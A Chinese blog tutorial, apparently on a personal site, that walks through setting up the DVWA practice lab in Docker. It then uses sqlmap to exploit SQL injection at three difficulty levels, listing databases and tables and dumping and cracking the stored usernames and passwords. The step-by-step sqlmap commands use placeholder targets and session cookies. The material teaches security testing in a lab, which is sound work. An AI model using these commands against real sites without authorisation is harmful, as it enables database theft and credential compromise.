<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>DVWA靶场-SQL Injection（难度低、中、高）-sqlmap自动化漏洞扫描 - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/dd4126153d78c5f3445f71b6036b7d23/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="DVWA靶场-SQL Injection（难度低、中、高）-sqlmap自动化漏洞扫描">
  <meta property="og:description" content="DVWA靶场-SQL Injection（难度低、中、高）-sqlmap自动化漏洞扫描 一、环境搭建 1.搭建dvwa靶场环境 此处使用docker容器搭建靶场。使用docker平台即可实现靶场的快速搭建，比较方便。使用docker搜索dvwa镜像：docker search dvwa。
此处选择第一个镜像文件下载：docker pull citizenstig/dvwa。
下载完毕后，可以使用docker images来查看所有的镜像，从中可以找到dvwa。
从图中可以看出已经将镜像文件下载到本地，使用以自定义的密码启动mysql服务，并以后台方式运行的方式：docker run --name dvwa -d -p 80:80 -p 3306:3306 -e MYSQL_PASS=“mypass” docker.io/citizenstig/dvwa。
截图中可以看到，容器中的80端口映射到本机80端口冲突，是因为本机80端口已被占用，所以端口映射改成”-p 8080:80”，这样就不会有端口冲突。 此处可以选择没有被占用的端口进行映射。
展示正在运行的容器列表及主要信息：docker ps（加上-a参数展示全部容器列表）。
浏览器输入本机IP:8080，访问得到dvwa页面，如果访问不成功，重启docker：systemctl restart docker，再运行dvwa：docker start dvwa。
注意：此处setup check处除reCAPTCHA key选项为红色外，其余选项都要为绿色才算成功搭建。第一次登录需要创建数据库，点击“Create/Reset Database”按钮。
2.设置靶场 接下来我们要进入靶场。登录dvwa，默认的用户名密码是：admin/password。
登录进来之后页面如下图所示：
我们要先去DVWA Security选项后中调节难度，可调节为low、medium、high以及impossible。先将难度改为low，点击Submit按钮。后续会逐步调高难度。
3.寻找目标注入点 调节难度后点击SQL Injection选项，可以看到有个User ID输入框，尝试输入1点击提交。
可以看到，提交后，页面给出回显，提交请求的URL变成了 IP:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#，这就是我们的目标注入点。
二、安装sqlmap 安装具体步骤可查看https://blog.csdn.net/Z_David_Z/article/details/113278533
此处使用kali自带的sqlmap。打开shell，输入sqlmap -h即可查看sqlmap指令。
图中标示的-u参数是使用中经常使用的一个参数，其后接目标url，即可进行自动注入。
三、使用sqlmap自动化扫描 （一）low级别难度 1.使用 -u参数进行自动注入 sqlmap -u “目标url”
在使用-u参数的时候遇到了登录验证的问题，系统重定向到了登录页面，所以此时我们要在使用sqlmap的时候加上cookie参数来授权给sqlmap。
2.添加cookie参数 在浏览器登录访问之后，按F12进入开发者工具，选择Network选项，此时该选项下无数据。
刷新页面后，出现文件后单击第一个文件，出现Request Headers后选择Cookie值
右键该值，选择Copy，再粘贴到刚刚的sqlmap命令添加的cookie参数中。
sqlmap -u “目标url” --cookie “站点cookie”">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-01-15T09:35:01+08:00">
    <meta property="article:modified_time" content="2024-01-15T09:35:01+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">DVWA靶场-SQL Injection（难度低、中、高）-sqlmap自动化漏洞扫描</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="DVWASQL_Injectionsqlmap_0"></a>DVWA靶场-SQL Injection（难度低、中、高）-sqlmap自动化漏洞扫描</h2> 
<h3><a id="_2"></a>一、环境搭建</h3> 
<h4><a id="1dvwa_3"></a>1.搭建dvwa靶场环境</h4> 
<p>此处使用docker容器搭建靶场。使用docker平台即可实现靶场的快速搭建，比较方便。使用docker搜索dvwa镜像：docker search dvwa。<br> <img src="https://images2.imgbox.com/d3/04/sB7kpzem_o.png" alt="docker搜索dvwa"><br> 此处选择第一个镜像文件下载：docker pull citizenstig/dvwa。<br> <img src="https://images2.imgbox.com/4b/2d/qB1vc3xs_o.png" alt="下载镜像文件"><br> 下载完毕后，可以使用docker images来查看所有的镜像，从中可以找到dvwa。<br> <img src="https://images2.imgbox.com/29/6f/ZfxoVhMA_o.png" alt="镜像下载成功"><br> 从图中可以看出已经将镜像文件下载到本地，使用以自定义的密码启动mysql服务，并以后台方式运行的方式：docker run --name dvwa -d -p 80:80 -p 3306:3306 -e MYSQL_PASS=“mypass” docker.io/citizenstig/dvwa。<br> <img src="https://images2.imgbox.com/65/10/NxO2Zkbu_o.png" alt="运行容器"><br> 截图中可以看到，容器中的80端口映射到本机80端口冲突，是因为本机80端口已被占用，所以端口映射改成”-p 8080:80”，这样就不会有端口冲突。 此处可以选择没有被占用的端口进行映射。<br> 展示正在运行的容器列表及主要信息：docker ps（加上-a参数展示全部容器列表）。<br> <img src="https://images2.imgbox.com/8a/55/PUXNI2PU_o.png" alt="展示容器"><br> 浏览器输入本机IP:8080，访问得到dvwa页面，如果访问不成功，重启docker：systemctl restart docker，再运行dvwa：docker start dvwa。<br> 注意：此处setup check处除reCAPTCHA key选项为红色外，其余选项都要为绿色才算成功搭建。第一次登录需要创建数据库，点击“Create/Reset Database”按钮。<br> <img src="https://images2.imgbox.com/68/a7/oUUrdbRy_o.png" alt="靶场搭建成功"></p> 
<h4><a id="2_18"></a>2.设置靶场</h4> 
<p>接下来我们要进入靶场。登录dvwa，默认的用户名密码是：admin/password。<br> <img src="https://images2.imgbox.com/87/97/muHeEDUo_o.png" alt="登录界面"><br> 登录进来之后页面如下图所示：<br> <img src="https://images2.imgbox.com/3e/39/DGVVDffi_o.png" alt="首页"><br> 我们要先去DVWA Security选项后中调节难度，可调节为low、medium、high以及impossible。先将难度改为low，点击Submit按钮。后续会逐步调高难度。<br> <img src="https://images2.imgbox.com/7d/87/cuGZ4jNn_o.png" alt="调节难度"></p> 
<h4><a id="3_25"></a>3.寻找目标注入点</h4> 
<p>调节难度后点击SQL Injection选项，可以看到有个User ID输入框，尝试输入1点击提交。<br> <img src="https://images2.imgbox.com/2a/d8/PLsQtkzG_o.png" alt="提交结果"><br> 可以看到，提交后，页面给出回显，提交请求的URL变成了 IP:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#，这就是我们的目标注入点。</p> 
<h3><a id="sqlmap_29"></a>二、安装sqlmap</h3> 
<p>安装具体步骤可查看https://blog.csdn.net/Z_David_Z/article/details/113278533<br> 此处使用kali自带的sqlmap。打开shell，输入sqlmap -h即可查看sqlmap指令。<br> <img src="https://images2.imgbox.com/85/e5/Uw7QR86w_o.png" alt="sqlmap"><br> 图中标示的-u参数是使用中经常使用的一个参数，其后接目标url，即可进行自动注入。</p> 
<h3><a id="sqlmap_35"></a>三、使用sqlmap自动化扫描</h3> 
<h4><a id="low_36"></a>（一）low级别难度</h4> 
<h5><a id="1_u_37"></a>1.使用 -u参数进行自动注入</h5> 
<blockquote> 
 <p>sqlmap -u “目标url”</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/f6/6b/h8HSrUKG_o.png" alt="直接-u"></p> 
<p>在使用-u参数的时候遇到了登录验证的问题，系统重定向到了登录页面，所以此时我们要在使用sqlmap的时候加上cookie参数来授权给sqlmap。</p> 
<h5><a id="2cookie_44"></a>2.添加cookie参数</h5> 
<p>在浏览器登录访问之后，按<code>F12</code>进入开发者工具，选择<code>Network</code>选项，此时该选项下无数据。<br> <img src="https://images2.imgbox.com/57/9e/CViThrJK_o.png" alt="F12开发者工具"><br> 刷新页面后，出现文件后单击第一个文件，出现Request Headers后选择Cookie值<br> <img src="https://images2.imgbox.com/07/5b/tkIp2ISa_o.png" alt="查找cookie"><br> 右键该值，选择Copy，再粘贴到刚刚的sqlmap命令添加的cookie参数中。</p> 
<blockquote> 
 <p>sqlmap -u “目标url” --cookie “站点cookie”</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/19/e4/k394wFPV_o.png" alt="sqlmap添加cookie"></p> 
<h5><a id="3_54"></a>3.自动注入</h5> 
<p>注意：在注入时，会遇到sqlmap频繁询问现象，可以使用<code>--batch</code>参数，这样每次询问自动选择<code>y</code>选项。<br> sqlmap会对<code>id</code>和<code>Submit</code>两个参数进行自动注入，最终得出参数<code>id</code>可注入，并注入出后台的数据库类型、操作系统和中间件版本。<br> <img src="https://images2.imgbox.com/6a/40/bDhYkmb1_o.png" alt="注入结果"></p> 
<p>既然存在注入点，那就开始获取数据库名。</p> 
<blockquote> 
 <p>sqlmap -u “目标url” --cookie “站点cookie” --dbs</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/d4/9c/HzYAxJMz_o.png" alt="爆数据库名"></p> 
<p>从图中可以看出有4个数据库，其中information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。我们可以看下dvwa数据库中有什么表。</p> 
<blockquote> 
 <p>sqlmap -u “目标url” --cookie “站点cookie” -D “数据库名” --tables</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/43/68/l6CzrB1T_o.png" alt="爆表名"></p> 
<p>从图中可以看出dvwa数据库中有两张表，我们可以选择其中的users表来看下表的列名。</p> 
<blockquote> 
 <p>sqlmap -u “目标url” --cookie “站点cookie” -D “数据库名” --T “表名” --columns</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/ef/f2/8uWgMAWq_o.png" alt="爆列名"><br> users表中共有8列，如果想看表中具体的数据，可以把<code>--columns</code>改为<code>--dump</code> ,这样就会获取这张表中的数据。</p> 
<blockquote> 
 <p>sqlmap -u “目标url” --cookie “站点cookie” -D “数据库名” --T “表名” --dump</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/6f/a0/XLRdQE0I_o.png" alt="爆数据"><br> 这样我们就获得了dvwa数据库users表里所有的数据，包括账户名和加密存储的账户密码。我们还可以查询指定列的数据。</p> 
<blockquote> 
 <p>sqlmap -u “目标url” --cookie “站点cookie” -D “数据库名” --T “表名” --C “列名1”，“列名2” --dump</p> 
</blockquote> 
<p>我们选择查询账户名和密码，由于mysql数据库对密码字段做了哈希，命令执行过程中会询问你是否进行解析，这里选了y。<br> <img src="https://images2.imgbox.com/ca/c3/OYuKAKs4_o.png" alt="爆密码"><br> 到这里就完成了dvwa靶场中low级别难度的sqlmap自动注入，成功拿到了dvwa数据库的用户名和密码。</p> 
<h4><a id="medium_86"></a>（二）medium级别难度</h4> 
<h5><a id="1medium_87"></a>1.调整为medium级别难度</h5> 
<p>我们先把靶场难度提高到medium级别后，看到原本的输入框变成了下拉选择框，尝试选择1进行提交后有回显，但url无变化，请求方式也由GET变成了POST。<br> <img src="https://images2.imgbox.com/d4/8f/0YMoZHst_o.png" alt="难度升级"></p> 
<h5><a id="2_90"></a>2.查找注入点</h5> 
<p>此时，如果使用之前的命令sqlmap会告诉我们缺少请求字段数据，对于POST请求，发送的数据放在了请求体里，而不是在URL里。<br> <img src="https://images2.imgbox.com/73/9a/gDi1JWfs_o.png" alt="post请求参数"></p> 
<p>那我们使用<code>--data</code>参数，将post请求中发送的参数按照<code>参数1=值1&amp;参数2=值2</code>的格式放进来。</p> 
<blockquote> 
 <p>sqlmap -u “目标url” --data “发送的参数” --cookie “站点cookie”</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/ad/8f/Cq3S9BAc_o.png" alt="data参数"></p> 
<p>最终，注入点查找成功。<br> <img src="https://images2.imgbox.com/1b/9e/gg5FFSCd_o.png" alt="注入成功"></p> 
<h5><a id="3_102"></a>3.自动注入</h5> 
<p>其余步骤就如同low级别时一致，只是多了<code>--data</code>参数。</p> 
<blockquote> 
 <p>sqlmap -u “目标url” --data “发送的参数” --cookie “站点cookie” --dbs</p> 
</blockquote> 
<blockquote> 
 <p>sqlmap -u “目标url“ --data “发送的参数” --cookie “站点cookie” -D “数据库名” --tables</p> 
</blockquote> 
<blockquote> 
 <p>sqlmap -u “目标url“ --data “发送的参数” --cookie “站点cookie” -D “数据库名” -T “表名” --columns</p> 
</blockquote> 
<blockquote> 
 <p>sqlmap -u “目标url“ --data “发送的参数” --cookie “站点cookie” -D “数据库名” -T “表名” -C “列名1”，“列名2” --dump</p> 
</blockquote> 
<h4><a id="high_113"></a>（三）high级别难度</h4> 
<h5><a id="1high_114"></a>1.调整为high级别难度</h5> 
<p>我们先把靶场难度提高到high级别后，看到的是一个点击链接，点击后弹出以一个带输入框的新页面，在新页面输入1后点击提交，原页面回显内。原页面数据包请求方式为get，弹出的输入页面请求方式为post。<br> <img src="https://images2.imgbox.com/58/5a/zPxIuDiN_o.png" alt="high级别难度"></p> 
<h5><a id="2_117"></a>2.查找注入点</h5> 
<p>输入页面和原页面是不同的url，此时需要用到联合查询命令<code>second-url</code>。</p> 
<blockquote> 
 <p>sqlmap -u “输入页面url” --data “发送的参数” --second-url “原页面url” --cookie “站点cookie”</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/0b/20/capayz10_o.png" alt="second-url"><br> 最终，注入点查找成功。</p> 
<p><img src="https://images2.imgbox.com/e4/5c/897x80Tc_o.png" alt="注入点查找成功"></p> 
<h5><a id="3_125"></a>3.自动注入</h5> 
<p>其余步骤就如同medium级别时一致，只是多了<code>--second-url</code>参数。</p> 
<blockquote> 
 <p>sqlmap -u “输入页面url” --data “发送的参数” --second-url “原页面url”–cookie “站点cookie” --dbs</p> 
</blockquote> 
<blockquote> 
 <p>sqlmap -u “输入页面url“ --data “发送的参数” --second-url “原页面url” --cookie “站点cookie” -D “数据库名” --tables</p> 
</blockquote> 
<blockquote> 
 <p>sqlmap -u “输入页面url“ --data “发送的参数” --second-url “原页面url” --cookie “站点cookie” -D “数据库名” -T “表名” --columns</p> 
</blockquote> 
<blockquote> 
 <p>sqlmap -u “输入页面url“ --data “发送的参数” --second-url “原页面url” --cookie “站点cookie” -D “数据库名” -T “表名” -C “列名1”，“列名2” --dump</p> 
</blockquote>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/da479e6ba0ebdd8992c3ade15b0b346e/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【图解数据结构】深入剖析时间复杂度与空间复杂度的奥秘</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/9ac4f71b7c00f7a3791b1613699bcbf3/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">万元预算打造高质量13B私有模型，Colossal-AI LLaMA-2 开源方案再升级</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>